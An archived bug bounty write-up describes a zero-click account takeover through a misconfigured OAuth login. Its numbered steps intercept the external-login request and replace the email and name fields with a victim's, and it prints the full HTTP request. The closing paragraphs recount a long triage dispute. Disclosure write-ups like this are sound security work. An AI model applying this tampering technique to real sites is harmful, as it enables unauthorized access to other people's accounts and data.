# 0-Click Account Takeover via OAuth Misconfiguration

- **Source URL:** https://saeidmicro.medium.com/0-click-account-takeover-via-oauth-misconfiguration-24058cbee2a2?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250919132816/https://saeidmicro.medium.com/0-click-account-takeover-via-oauth-misconfiguration-24058cbee2a2
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10465 (id 10465)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 0-Click Account Takeover via OAuth Misconfiguration

### Overview of the Vulnerability:

OAuth is an authorization framework used to identify and authenticate users for an application. There are a number of implementation misconfigurations which can lead to an OAuth framework being implemented insecurely that an attacker can leverage to take over multiple user accounts and manipulate or retrieve data.

### Steps:

1. Identify the victim and get his email.
2. Go to the login page `https://www.[Redacted].com/login`
3. Click on sign with google, before choose the new one you created, intercept the request from burpsuite, and click on Forward request by request, and stop when see the \[Redacted\] host and endpoint is `/api/membership/external-login`

```
POST /api/membership/external-login HTTP/2
Host: www.Redacted.com
Cookie:  [Redacted]
User-Agent: [Redacted]
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.Redacted.com/login?returnurl=%2Faccount
Content-Type: application/json
Request-Context:  [Redacted]
Request-Id: [Redacted]
Traceparent: [Redacted]
Content-Length: 1617
Origin: https://www.Redacted.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
{"externalService":1,"accessToken":"[Redacted]","userID":"[Redacted]","email":"example@gmail.com","name":"Example","isPersistent":true,"isShoppingCart":false,"referrer":5,"RedactedAppCode":"","RedactedAppTimeToken":0,"RedactedUserGuid":"","RedactedAppLoginToken":"","pageNodeGUID":"[Redacted]","firstUTMSource":"","firstUTMMedium":"","firstUTMCampaign":"","lastUTMSource":"","lastUTMMedium":"","lastUTMCampaign":""}
```
4\. All you have to do is write the victim’s email in “email” and victim’s name in “name”.

`"email":"victim@gmail.com","name":"victim"`
5\. Then Forward all next request.

6\. Now you are in the victim account, can view and edit any data.

But when I decided to test it again it didn’t work, I noticed that the accessToken and userID were not important, but if I changed the email I was testing with and matched the victim’s name and email, the victim’s account was accessed by me and this was a very strange scenario.


But guess what the triager response was?

I was crazy because the exploit works and I tested it several times, and even proved it on the analyst’s account, but the response was:

After more than ten discussions on the same report and sending more than **5 video** and more than **10 photos, Lemonade was finally convinced.**

The discussion continued for more than 15 days.

4 months until you get the reward..
